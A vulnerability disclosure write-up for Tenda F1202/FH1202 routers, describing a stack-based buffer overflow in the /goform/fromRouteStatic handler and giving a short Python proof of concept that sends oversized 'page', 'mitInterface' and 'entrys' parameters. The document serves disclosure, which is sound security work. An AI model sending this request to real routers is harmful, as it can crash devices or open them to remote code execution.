# Tenda Router Vulnerability on fromRouteStatic function

This vulnerability lies in the `/goform/fromRouteStatic` page which influences the lastest version of Tenda Router F1202,FH1202. (The latest version is [F1202V1.0BR_V1.2.0.20(408)](https://www.tenda.com.cn/download/detail-2671.html))[FH1202_V1.2.0.19_EN](https://www.tendacn.com/us/download/detail-2693.html) and influence AC7V1.0,PW201A

## Vulnerability Description

There is a **stack-based buffer overflow** vulnerability in function `page` and `mitInterface`.

In function `fromRouteStatic` it reads 1 user provided parameters `page` into `v3` and `mitInterface` into v2, and the variable is passed into function `sprintf` without any length check, which may overflow the stack-based buffer `v5`, it's the same with `v6`.

![Vulnerability Function](./vuln.png)

So by requesting the page `/goform/fromRouteStatic`, the attacker can easily perform a **Deny of Service Attack** or **Remote Code Execution** with carefully crafted overflow data.

## PoC

```python
import requests

IP = "10.10.10.1"
url = f"http://{IP}/goform/fromRouteStatic?"
url += "page=" + "s" * 0x200
url += "&mitInterface="+'s'*0x200 
url += "&entrys="+'s'*0x200


response = requests.get(url)
```

## Timeline

* 2022-06-29: Report to CVE & CNVD;


## Acknowledge